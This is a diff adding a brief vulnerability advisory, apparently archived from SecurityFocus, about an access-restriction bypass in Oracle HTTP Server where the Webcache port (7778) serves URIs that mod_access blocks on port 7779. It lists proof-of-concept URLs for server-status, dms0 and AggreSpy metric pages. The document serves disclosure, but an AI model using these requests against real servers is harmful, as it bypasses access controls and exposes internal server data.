@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/13418/info
+
+Oracle HTTP Server(OHS) of Oracle Application Server is prone to an access restriction bypass vulnerability.
+
+It is possible to configure a list of forbidden URIs in OHS. This is accomplished using 'mod_access'. A URI that is listed is not supposed to be accessible to certain clients, depending on the configuration. However, reports indicate that the Oracle Webcache client may be used to access URIs regardless of the restrictions outlined in OHS 'mod_access'. 
+
+(Port 7778 = Webcache, Port 7779 = OHS)
+
+The following URLs are NOT protected if you access them via Webcache:
+http://example.com:7778/dmsoc4j/AggreSpy?format=metrictable&nountype=ohs_child&orderby=Name
+http://example.com:7778/server-status
+http://example.com:7778/dms0
+
+The following URLs are protected:
+http://example.com:7779/dmsoc4j/AggreSpy?format=metrictable&nountype=ohs_child&orderby=Name
+http://example.com:7779/server-status
+http://example.com:7779/dms0 
